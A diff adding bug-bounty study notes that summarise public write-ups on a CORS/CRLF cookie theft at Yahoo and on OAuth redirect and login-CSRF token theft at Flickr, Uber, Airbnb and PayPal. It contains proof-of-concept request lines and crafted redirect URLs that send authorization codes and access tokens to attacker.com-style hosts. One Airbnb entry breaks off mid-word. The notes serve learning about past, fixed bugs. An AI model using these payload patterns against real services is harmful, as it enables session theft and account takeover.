@@ -246,6 +246,31 @@ Some specific topics about bug hunting.
     - It accepted any `*.yahoo.com` subdomain in the `origin` and reflected it back in the `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. This meant if he could find an XSS on `*.yahoo.com`, he could leverage it to steal contacts.
   - A few days passed and the author still hadn't found an XSS. Then he saw a tweet regarding a wontfix Copy+Paste XSS in Yahoo Mail. Things get easy.
   - The author gave a proc, that required a logged in user to copy the proc and paste it into Yahoo Mail.
+- [Stealing $10,000 Yahoo Cookies!](https://blog.witcoat.com/2018/05/30/stealing-10000-yahoo-cookies/) by Bull
+  - The author started to script python, so he decided to write some recon script to filter out domains to attack first out of tens of thousands of Yahoo subdomains which promises some content, since it doesn't seem feasible to visit each one of them.
+  - The script outputted `https://premium.advertising.yahoo.com`. Upon visiting and taking a look at intercepted requests, the page was interacting with "api endpoints" at `https://api.advertising.yahoo.com` using "XmlHttpRequests" and "CROS".
+  - In a requests to `https://api.advertising.yahoo.com/services/network/whoami`, the author saw a lot of headers he sees all day while looking into yahoo in response which kind of freaked him out. It was reflecting all his request header such as `user agent`, `Accept` and `Cookie`.
+  - Aslo any parameters in GET requests were getting reflected as response headers:
+    - request: `GET /services/network/whoami?Test=Try HTTP/1.1`, `Host: api.advertising.yahoo.com`
+    - response: `HTTP/1.1 401 Unauthorized`, `Test: Try`
+  - Also it was using "CORS" and allowed any domain:
+    - request: `GET /services/network/whoami HTTP/1.1`, `Host: api.advertising.yahoo.com`, `http://www.anydomain.com`
+    - response: `HTTP/1.1 401 Unauthorized`, `Access-Control-Allow-Origin: http://www.anydomain.com`, `Access-Control-Allow-Credentials: True`
+    - But there was not anything to read from the page, as "CORS" allow reading content from the page and don't allow reading any of the headers.
+  - But "CORS" technology can be used by server to allow browser (client) to read "response headers" by adding a "special header" (`Access-Control-Expose-Header: whateverheader`) to the "response headers". Tring to add this "special header" from GET parameter:
+    - request: `GET /services/network/whoami?Access-Control-Expose-Headers=Cookie HTTP/1.1`, `Host: api.advertising.yahoo.com`
+    - No header got added to the response. All these special headers both in capital and small letters were blacklisted.
+  - Tried to "CRLF":
+    - request: `GET /services/network/whoami?test%0d%0ame=nicely HTTP/1.1`, `Host: api.advertising.yahoo.com`
+    - response: `HTTP/1.1 401 Unauthorized`, `testme: nicely`
+    - Also got a blacklist sanitiser for "CRLF".
+    - The author loves to have lame filters in place instead of no filters, it helps bypass other things, or sometimes chrome auditor in case of XSS.
+  - Tried:
+    - request: `GET /services/network/whoami?Access-Control-Expose-Header%0d%0as=Cookie`, `Host: api.advertising.yahoo.com`
+    - response: `HTTP/1.1 401 Unauthorized`, `Access-Control-Expose-Headers: Cookie`
+    - `Access-Control-Expose-Header%0d%0as` is not a special header, so was not filtered out by 1st blacklist filter, and the 2nd filter always sanitises blacklisted bytes `%0d%0a`.
+  - The author also verified that the stolen cookies were also working for the user in "Yahoo mail" or any other service by using them in respective services / requests.
+  - The author gave a poc to read "reflected cookie header" from "response header", which is worth to study.
 
 ### OAuth
 
@@ -368,6 +393,114 @@ Some specific topics about bug hunting.
     - The `.done` parameter on the `login.yahoo.com` endpoint only allows `https://www.flickr.com/signin/yahoo/`.
     - The image embedding logic's bypass using `/\/\` is also fixed.
     - There is now "CSP" applied on the "Flickr forum".
+- [Flickr ATO Fix Bypass](https://ngailong.wordpress.com/2017/08/07/flickr-ato-fix-bypass/) by Ron Chan
+  - The author bypssed the previous vulnerability's fix.
+  - Yahoo restricted the `redirect_uri` directory could only be `/signin/yahoo`.
+    - If you do something like: `https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=hk&.done=https%3a%2f%2fwww.flickr.com%2Fsignin%2Fyahoo%2F..%2f..%2f%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fflickrrrrr&.crumb=`, there is no "access token" returned.
+    - The directory is difficult to escaped, no more `../`.
+  - However the payload behind "%3f" seems quite free to mess with, so the author appended a hash behind the URL.
+    - `https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=hk&.done=https%3a%2f%2fwww.flickr.com%2Fsignin%2Fyahoo%2F%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fflickrrrrr%23&.crumb=`
+    - The `%23` is decoded the `#` in the response.
+    - `.data` is appended behind the hash.
+    - This means, if he can find any "open redirect" in Flickr, then he can smuggle `.data` to attacker site.
+  - "open redirect" in Flickr is not difficult to find as Yahoo does not accept "open redirect" as valid report.
+    - `https://www.flickr.com/cookie_check.gne?pass=http://www.attacker.com#`
+    - The "302 response" is: `http://www.attacker.com`
+  - So the poc URL:
+    - `https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=hk&.done=https%3a%2f%2fwww.flickr.com%2Fsignin%2Fyahoo%2F%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fcookie_check.gne%253fpass%253dhttp%253a%252f%252fattacker.com%2523&.crumb=`
+- [One More Thing to Check for SSO – Flickr ATO](https://ngailong.wordpress.com/2017/08/29/one-more-thing-to-check-for-sso-flickr-ato/) by Ron Chan
+  - The author has multiple "Yahoo accounts", at one point, he has "account A session" under `*.yahoo.com`, and has "account B session" under `*.flickr.com`, which is not his intended setup. Then he luckily browse to `https://www.flickr.com/login` base on browsing history in URL bar, and then the website said "You are logging in as ngalongc, are you switching your account to ronchan5?".
+    - This page is interesting is not because its content, it is interesting because the URL of that page actually is storing the `.data` of user temporarily.
+    - After some validation, the author confirm the `.data` could be reused. This is the point we need a "open redirect" and steal the URL by using referer technique.
+  - The `pass` parameter is used for URL redirection, it has some whitelist validation in place to prevent "open redirect", but it coult be bypassed by the payload:
+    - `https://www.flickr.com/cookie_check.gne?pass=https://www.flickr.com%252f@hackerone.com/yahoo`
+  - However, victim needs to have exact same scenario as attacker, which is, they have "account A" autenticated in `*.yahoo.com` and "account B" authenticated in `*.flickr.com`. As this scenario is not that common for normal user, this would drastically decrease the security impact of the bug (always think the attack scenario!).
+  - The author wanted to find a workaround to make it work across all user, so he kept observing the login flow. Finally he notice one simple fact that could turn this bug works universally: Flickr is vulnerable to "login CSRF".
+    - We can first force victim to login "our Flickr account" while keeping "victim's yahoo session" intact, then send the explit payload to victim haver their payload stolen by using the "open redirect".
+  - The poc in this writeup is worth to study.
+- [Yahoo Bug Bounty: Exploiting OAuth Misconfiguration To Takeover Flickr Accounts](https://mishresec.wordpress.com/2017/10/12/yahoo-bug-bounty-exploiting-oauth-misconfiguration-to-takeover-flickr-accounts/) by mishre
+  - Some time has passed since the author have tested "Flickr's login flow", so he have decided to take a look and see if something has changed. Surprisingly, he have noticed that Yahoo implemented the classic "OAuth login flow".
+  - When a user wants to login to `flickr.com` he clicks a "sign-in" button which redirects him to:
+    - `https://api.login.yahoo.com/oauth2/request_auth?client_id=dj0yJmk9NTJmMkVmOFo3RUVmJmQ9WVdrOVdXeGhVMWx3TjJFbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD01OA–&redirect_uri=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2Foauth%2F%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252F%253Fytcheck%253D1%2526new_session%253D1&response_type=code&scope=openid%2Csdpp-w&nonce=bb1c92e088f38e9c323fe025d42c405f&.scrumb=jeTYmScEVYq`
+  - If the user is not signed in to Yahoo, he is redirected to the "Yahoo login page" to enter his credentials and then back to the mentioned URL. What happens after arriving to the "OAuth endpoint" is that Yahoo generates a `code` to identify the logged in user, which is sent back to Flickr via another redirect:
+    - `https://www.flickr.com/signin/yahoo/oauth/?redir=https://www.flickr.com/?ytcheck=1&new_session=1&code={redacted}`
+  - What happens now is that in the background Flickr exchanges the `code` supplied by Yahoo for an "access token", and retrieves data about the user using this "access token".
+  - While testing "Yahoo's OAuth implementation", the author came across the page `https://developer.yahoo.com/oauth2/guide/openid_connect/getting_started.html` stating that it's possible to set the `response_type` parameter to contain multiple values. So he decided to check what happens if he set the parameter to have the vaule: `code id_token`. Yahoo were appending both the `code` and the `id_token` to the fragment part of the URL, redirecting him to:
+    - `https://www.flickr.com/signin/yahoo/oauth/?redir=https://www.flickr.com/?ytcheck=1&new_session=1#code={redacted}&id_token={redacted}`
+    - The fragment part of the URL (everything after `#`) is preserved when handling redirect responses from the server. So using this minor issue, we could potentially leak a victim's `code` parameter to anywhere the `redir` parameter points to.
+  - Flickr only performs the redirect if a valid `code` is passed to the server via the query string. So, for an attacker to be able to leak the code, he actually needs to generate a `code` using his own account and then send it as part of the `redirect_uri` URL (how did the author find out this feature?).
+  - Yahoo correctly verified that the URL is of the form: `https://www.flickr.com/*`. This means that we need to find an "open redirect" on `flickr.com` in order to leak the authentication `code` to an attacker's domain. The author was finally able to find such a redirect after downloading the "Flickr android application". He noticed that if the wrong `token` value is passed to a social sharing endpoint (available though the Flickr app and not available via the website), a redirect is performed to the `callback_url` parameter:
+    - `https://www.flickr.com/sharing_connect.gne?service_type_id=9&token=a&callback_url=https%3A%2F%2F%2Fgoogle.com%2F`
+  - Attack flow: an attacker generates a Flickr authentication `code` for his own test account, he then constructs the following URL to send to the victim:
+    - `https://api.login.yahoo.com/oauth2/request_auth?client_id=dj0yJmk9NTJmMkVmOFo3RUVmJmQ9WVdrOVdXeGhVMWx3TjJFbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD01OA–&redirect_uri=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2Foauth%2F%3Fcode%3D{here-is-the-attacker’s-code}%26redir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsharing_connect.gne%253Fservice_type_id%253D9%2526token%253Da%2526callback_url%253Dhttps%25253A%25252F%25252F%25252Fattacker.com%25252F&response_type=code id_token&scope=openid%2Csdpp-w&nonce=bb1c92e088f38e9c323fe025d42c405f&.scrumb=jeTYmScEVYq`
+- [Login CSRF + Open Redirect = Uber Account Take Over](https://ngailong.wordpress.com/2017/08/07/uber-login-csrf-open-redirect-account-takeover/) by Ron Chan
+  - This bug was in `central.uber.com`, it used "OAuth" as login mechanism, however the "CSRF" parameter is not used correctly, which allowed attacker to take advantage of the misused `state` parameter to perform "open redirect" and "login CSRF", then steal the "access token" in URL hash after redirect.
+  - When user pressed "login" in `central.uber.com`, it went like:
+    - `https://central.uber.com/login?state=/somewhere`
+    - `https://login.uber.com/oauth/authorize?response_type=code&scope=profile%20history&client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&state=%2Fsomewhere`
+    - `https://central.uber.com/oauth2-callback?state=%2F&code=it53JtFe6BPGH1arCLxQ6InrT4MXdd`
+    - `https://central.uber.com/somewhere`
+  - The author changed the `state` value from `/somwhere` to `//google.com` to get a potential "open redirect", the flow went like:
+    - `https://central.uber.com/login?state=//google.com`
+    - `https://login.uber.com/oauth/authorize?response_type=code&scope=profile%20history&client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&state=%2F%2fgoogle.com`
+    - `https://central.uber.com/oauth2-callback?state=%2F%2fgoogle.com&code=it53JtFe6BPGH1arCLxQ6InrT4MXdd`
+    - `//google.com`
+  - Since the "OAuth request" was using `code` instead of `token`, so even with "open redirect", we couldn't steal anything from this flow. So changed the request from `code` to `token`:
+    - `https://login.uber.com/oauth/authorize?response_type=token&scope=profile%20history&client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&state=%2F%2fgoogle.com`
+    - `https://central.uber.com/oauth2-callback?state=%2F%2fgoogle.com#access_token=xxxxx`
+    - No redirect here.
+    - Because there was no valid `code` value for `https://central.uber.com/oauth2-callback`, so that there was no "open redirect" after step 2.
+    - We needed a workaround, we needed a valid `code` for that `oauth2-callback` endpoint.
+  - This moment was the perfect moment for "login CSRF" to take advantage in moment like this, since the CSRF parameter `state` was used as redirect purpose, we could just simply put out attacker's own valid OAuth `code` to the endpoint `oauth2-callback`, and sent that to victim, so victim would correctly redirect to attacker controlled page with the leaked "access token".
+  - PoC URL: `https://login.uber.com/oauth/authorize?response_type=token&scope=profile%20history%20places%20ride_widgets%20request%20request_receipt%20all_trips&client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback%3fcode%3d{attacker_valid_oauth_code}&state=%2F%2fhackerone.com`
+- [Uber - redirect_uri is difficult to do it right](https://ngailong.wordpress.com/2017/11/22/uber-redirect_uri-is-difficult-to-do-it-right/) by Ron Chan
+  - The author didn't have automation in his bug hunting, no "sqlmap", "sublist3r" or "jsparser". He tried, they just didn't work out for him. Other than a "VPS server" that help him to brute force certain endpoints to make a poc occasionall, all he have is a "Burp Pro license" on MBP.
+  - `site:uber.com`, `site:uberinternal.com`, `site:yahoo.com` is his hobby, looking through 15K of requests per day in Burp is daily job. Not going after "reflective XSS" or "stored XSS" except it's right in his face. Test where the site leads him, check 10 variations of `redirect_uri` if the site use "OAuth". Most of his findings are irregular and spontaneous.
+  - Uber allowed "Facebook login" in both `login.uber.com` and `auth.uber.com`, when we click "login with Facebook" button on the page, the flow:
+    - `https://facebook.com/xxxx?client_id=xxxxxx&redirect_uri=https%3a%2f%2fauth.uber.com%2flogin%3fnext_url=https%3A%2F%2Frush.uber.com%2Flogin%2F&state=m7QWxxPRNII4VGsCSog0xLJ2KF7e8ynpC2c_OAKkQQk%3D`
+    - `https://auth.uber.com/login?next_url=https%3A%2F%2Frush.uber.com%2Flogin%2F&state=m7QWxxPRNII4VGsCSog0xLJ2KF7e8ynpC2c_OAKkQQk%3D#access_toekn=xxxx`
+    - `https://rush.uber.com/login?&#8230;.#access_token=xxxx`
+  - "login endpoint" allowed further redirect to `*.uber.com`. So if it is possible to find "open redirect" in the `next_url` parameter, and redirect user to `*.uber.com` then to attacker controlled site, then we are able to steal the access token in URL.
+    - Cause Uber is not accepting "open redirect" as valid submission anymore, finding one is not that difficult. One "open redirect" that still work is `https://login.uber.com/logout`, it redirects base on "referer header".
+  - PoC: `<a href="https://facebook.com/xxxx?client_id=xxxxxx&redirect_uri=https%3a%2f%2fauth.uber.com%2flogin%3fnext_url=https%3A%2F%2Flogin.uber.com%2Flogout%2F&state=state">Click to leak</a>alert(location.hash)`
+  - After Uber fixed this issue, the author figured Uber "FB login" is still hosting two whitelisted `redirect_uri`: `https://auth.uber.com/login` and `https://login.uber.com/login`. In theory, these should be difficult to exploit against since they have already patched the bug of "open redirect", there is no way for the author to redirect user to `https://login.uber.com/logout` again.
+  - The author explored Facebook `redirect_uri`, if `https://www.example.com/directory` is whitelisted URL, then the variety of `redirect_uri` should be:
+    - `redirect_uri=https%3a%2f%2fwww.example.com%2fdirectory`, passed.
+    - `redirect_uri=https%3a%2f%2fwww.example.com%2fdirectory%3fparameter%3dvalue`, passed.
+    - `redirect_uri=https%3a%2f%2fwww.example.com%2fdirectory%3fparameter%3dvalue%23`, failed, since `%23` in the end of URL.
+    - `redirect_uri=https%3a%2f%2fwww.example.com%2fdirectory%2f..%2f..%2f`, failed, since it is using `../` to escape directory.
+    - `redirect_uri=https%3a%2f%2fwww.example.com%2fdirectory%252f..%252f..%252fescaped`, passed!!!
+  - This is the time to see whether the server accept the encoded slash `%2f`. Usually the server will not accept this and return "400 forbidden" or "404 not found". But `login.uber.com` happily accepted this as normalised directory in server side:
+    - `https://login.uber.com/login`, present "login page".
+    - `https://login.uber.com/logout`, present "logout page".
+    - `https://login.uber.com/login%2f..%2f..%2flogout`, present "logout page".
+  - PoC: `<a href="https://facebook.com/xxxx?client_id=xxxxxx&redirect_uri=https%3a%2f%2flogin.uber.com%2flogin%252f..%252f..%252flogout&state=state">Click to leak</a>alert(location.hash)`
+  - Fixed: removed `login.uber.com` as the whitelist `redirect_uri`.
+- [Authentication bypass on Airbnb via OAuth tokens theft](https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/) by Arne Swinnen
+  - Most publicly available examples of "OAuth token theft" attacks rely on modification of the `redirect_uri` parameter value in the call to an "identity provider" in order to steal either an `authorization code` or an `access_token` from an authenticated victim. This requires a non-exact match of `redirect_uri` configured vaules (e.g. wildcards for subdomains or paths in the URL) for the "service provider's application" on the "identify provider" end. Although the attacks are similar, their associated technique and impact is different:
+    - `authorization code`: Typically stolen via cross-domain leakage of the callback URL, which contains the precious authorization `code` GET parameter value that is appended the `redirect_uri` URL by the "identity provider" upon redirection. Impact is typically authentication bypass on the "service provider" end, as the stolen `code` can be used to login as the victim there.
+    - `access_token`: Typically stolen via a cross-domain "open redirect" chain, since the `access_token` is communicated back via an URL's location fragment (location.hash) by the "identity provider", which survives cross-domain server-side redirects in all modern browsers. Impact is typically access to the victim's "identity provider" with permissions of the "service provider's application".
+  - "login CSRF" in combination with an "HTTP referer header based open redirect" in "Airbnb's OAuth login flow", could be abused to steal "OAuth access tokens" of all Airbnb "identity providers" and eventually authenticate as the victim on Airbnb's website and mobile application.
+    - This attack did not rely on a specific OAuth "identify provider" app configuration flaw (e.g. wildcards in whitelisted `redirect_uri` URLs), which made it generic for all Airbnb's "identity providers".
+  - If an unauthenticated user browsed to a page on `www.airbnb.com` that required authentication (e.g. `https://www.airbnb.com/user/edit`), he / she was redirected to teh "login page". However, after successfully logging in, the user was automatically redirected back to the original page he / she requested initially. This functionality was implemented through Airbnb's `redirect_params` controller, which was not found vulnerable for external "open redirect" vulnerabilities.
+  - However, if the user was already logged into Airbnb when returning from an "identity provider", the `oauth_callback` endpoint would automatically redirect the user based on the "HTTP referer header" in the initiating OAuth login call to `/oauth_connect`. The "HTTP referer header" could be controlled by an attacker by design.
+  - If an attacker wants to exploit this, he / she must achieve three additional things: forge a request to the vulnerable endpoint with an arbitrary "HTTP referer header" while being authenticated to Airbnb and get some sensitive data such as "OAuth tokens" in the URL to effectively steal something useful.
+  - The OAuth authorization `code` value, which is communicated back in GET parameters to the Airbnb endpoint by Facebook & Google, gets lost during the redirections. However, both "identity providers" also offer communication of `access_tokens` via an "URL fragment" (the part after a hashtag in a URL) as opposed to URL parameters.
+    - "URL fragment" only exits on the client side and are properly preserved by the browser during redirects and accessible from Javascript, even by then last page in the "redirection chain" which is on a completely different origin.
+  - However, there are some additional problems:
+    - If we want to retrieve "URL fragments" from the "identity providers" to steal later on, we must be able to modify the OAuth request call to the provider (add `token` to the `response_type` parameter). However, this request is sent only after the initiating call to Airbnb OAuth endpoint `https://www.airbnb.cat/oauth_connect` in which the "open redirect via HTTP referer header exists", which is necessary for the overall attack.
+    - Airbnb's callback endpoint expects an authorization `code` via a URL GET parameter from the "identity provider". However, when receiving a "URL fragment" instead, it will consider the authentication attempt invalid and hen not perform the final redirect, since we are not logged in.
+  - These two issues were both solved by exploiting a "login CSRF" vulnerability via the same O
+- [All your Paypal OAuth tokens belong to me - localhost for the win](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html) by Antonio Sanso
+  - Basically like many online internet services "Paypal" offers the option to register you own "Paypal" application via a Dashboard. The better news (for "Paypal") is that they actually employs an "exact matching policy" for `redirect_uri`.
+  - While testing hhis own OAuth client, the author have noticed something a bit fishy. The easier way to describe it is using an OAuth application from "Paypal" itself. Basically "Paypal" has setup a "Demo Paypal application" to showcase their OAuth functionalities.
+  - The inital OAuth request:
+    - `https://www.paypal.com/signin/authorize?client_id=AdcKahCXxhLAuoIeOotpvizsVOX5k2A0VZGHxZnQHoo1Ap9ChOV0XqPdZXQt&response_type=code&scope=openid%20profile%20email%20address%20phone%20https://uri.paypal.com/services/paypalattributes%20https://uri.paypal.com/services/paypalattributes/business%20https://uri.paypal.com/services/expresscheckout&redirect_uri=https://demo.paypal.com/loginsuccessful&nonce=&newUI=Y`
+  - The author found out that the "Paypal authorization server" was also accepting `localhost` as `redirect_uri`. So:
+    - `https://www.paypal.com/signin/authorize?client_id=AdcKahCXxhLAuoIeOotpvizsVOX5k2A0VZGHxZnQHoo1Ap9ChOV0XqPdZXQt&response_type=code&scope=openid%20profile%20email%20address%20phone%20https://uri.paypal.com/services/paypalattributes%20https://uri.paypal.com/services/paypalattributes/business%20https://uri.paypal.com/services/expresscheckout&redirect_uri=https://localhost&nonce=&newUI=Y`
+    - This was still a valid request and the authorization code was then delivered back to `localhost`. But not a vulnerability.
+  - The next natural step was to creat a DNS entry for his website looking like `http://localhost.intothesymmetry.com/` and tried:
+    - `https://www.paypal.com/signin/authorize?client_id=AdcKahCXxhLAuoIeOotpvizsVOX5k2A0VZGHxZnQHoo1Ap9ChOV0XqPdZXQt&response_type=code&scope=openid%20profile%20email%20address%20phone%20https://uri.paypal.com/services/paypalattributes%20https://uri.paypal.com/services/paypalattributes/business%20https://uri.paypal.com/services/expresscheckout&redirect_uri=http://localhost.intothesymmetry.com/&nonce=&newUI=Y`. Worked.
 
 ### JSON Web Token
 - [How I got access to millions of -redacted- accounts](https://bitquark.co.uk/blog/2016/02/09/how_i_got_access_to_millions_of_redacted_accounts) by Bitquark
